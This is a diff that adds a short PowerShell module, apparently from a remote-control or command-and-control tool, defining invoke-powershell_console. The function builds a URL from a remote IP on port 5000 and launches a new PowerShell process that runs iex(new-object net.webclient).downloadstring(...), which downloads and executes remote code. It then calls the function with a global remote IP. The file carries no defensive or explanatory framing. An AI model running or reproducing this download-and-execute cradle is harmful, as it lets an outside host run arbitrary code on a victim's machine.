@@ -1,0 +1,53 @@
+
+
+
+
+
+
+
+function invoke-powershell_console
+    {
+
+    param(
+    [String] $ip
+    )
+
+     
+    $good = $false    
+    $results = $null
+    $uri = "http://" + $ip + ":5000/consola"
+    $command = "-command iex(new-object net.webclient).downloadstring('$uri');consola -id $global:id" 
+    $app = Start-Process powershell -PassThru -ArgumentList $command
+    if ($app.Id)
+     {
+      $good = $true
+      $results = "create new powershell console successfully"
+     }
+    return @{results=$results;success=$good}
+    }
+
+
+
+
+$execute = {
+  
+}
+
+
+
+
+
+
+$execute = invoke-powershell_console -ip  $global:remoteip
+
+
+
+  
+
+  
+
+    
+  
+
+
+return @{results=$execute.results;success=$execute.success}
